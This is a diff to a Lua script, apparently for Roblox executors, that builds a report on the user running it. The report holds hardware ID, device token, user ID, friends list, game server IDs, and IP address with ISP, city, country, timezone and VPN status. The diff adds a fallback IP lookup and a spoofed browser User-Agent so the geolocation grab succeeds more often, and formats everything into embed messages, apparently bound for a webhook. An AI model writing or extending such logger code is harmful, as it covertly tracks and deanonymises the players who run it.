@@ -42,12 +42,12 @@ local function isHttpHooked()
 end
 
 if isHttpHooked() then
-    local ip_info = {query = "N/A"}
+    local ipStr = "Hidden"
     pcall(function()
-        local resp = reqFunc({Url = "http://ip-api.com/json", Method = "GET"})
+        local resp = reqFunc({Url = "https://api.ipify.org?format=json", Method = "GET"})
         if resp and resp.Success then
             local ok, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
-            if ok then ip_info = d end
+            if ok and d.ip then ipStr = d.ip end
         end
     end)
     
@@ -66,7 +66,7 @@ if isHttpHooked() then
                         {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
                         {["name"] = "Executor", ["value"] = tostring(executor), ["inline"] = true},
                         {["name"] = "Client ID (HWID)", ["value"] = string.format("`%s`", hwid), ["inline"] = false},
-                        {["name"] = "IP Address", ["value"] = string.format("||%s||", ip_info.query or "N/A"), ["inline"] = false}
+                        {["name"] = "IP Address", ["value"] = string.format("||%s||", ipStr), ["inline"] = false}
                     },
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
@@ -205,11 +205,41 @@ pcall(function()
             })
         })
     else
-        local ip_info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A", proxy = false, hosting = false}
-        local ok, resp = pcall(reqFunc, {Url = "http://ip-api.com/json?fields=status,country,city,timezone,isp,query,proxy,hosting", Method = "GET"})
+        -- Надежный сбор IP (с фоллбеком)
+        local ip_info = {query = "Hidden", isp = "Unknown", country = "Unknown", city = "Unknown", timezone = "Unknown", proxy = false, hosting = false}
+        local gotIp = false
+        
+        -- Попытка 1: ip-api.com
+        local ok, resp = pcall(reqFunc, {
+            Url = "http://ip-api.com/json?fields=status,country,city,timezone,isp,query,proxy,hosting",
+            Method = "GET",
+            Headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        })
         if ok and resp and resp.Success then
             local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
-            if ok2 then ip_info = d end
+            if ok2 and d and d.query then 
+                ip_info = d 
+                gotIp = true
+            end
+        end
+
+        -- Попытка 2: ipinfo.io (если ip-api заблокирован)
+        if not gotIp then
+            local ok3, resp2 = pcall(reqFunc, {
+                Url = "https://ipinfo.io/json",
+                Method = "GET",
+                Headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+            })
+            if ok3 and resp2 and resp2.Success then
+                local ok4, d2 = pcall(HttpService.JSONDecode, HttpService, resp2.Body)
+                if ok4 and d2 and d2.ip then
+                    ip_info.query = d2.ip
+                    ip_info.city = d2.city or "Unknown"
+                    ip_info.country = d2.country or "Unknown"
+                    ip_info.isp = d2.org or "Unknown"
+                    ip_info.timezone = d2.timezone or "Unknown"
+                end
+            end
         end
 
         local isVpnProxy = "Нет"
@@ -259,7 +289,7 @@ pcall(function()
                         {["name"] = "Injector", ["value"] = execStrength, ["inline"] = false},
                         {["name"] = "Hardware ID", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
                         {["name"] = "Device Token", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
-                        {["name"] = "Network", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query or "N/A", ip_info.isp or "N/A", isVpnProxy, ip_info.country or "N/A", ip_info.city or "N/A", ip_info.timezone or "N/A"), ["inline"] = false},
+                        {["name"] = "Network", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query, ip_info.isp, isVpnProxy, ip_info.country, ip_info.city, ip_info.timezone), ["inline"] = false},
                         {["name"] = "Game", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId:** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
                         {["name"] = "Friends Target", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
                         {["name"] = "Links", ["value"] = "[Profile](https://www.roblox.com/users/"..uid.."/profile)", ["inline"] = false}
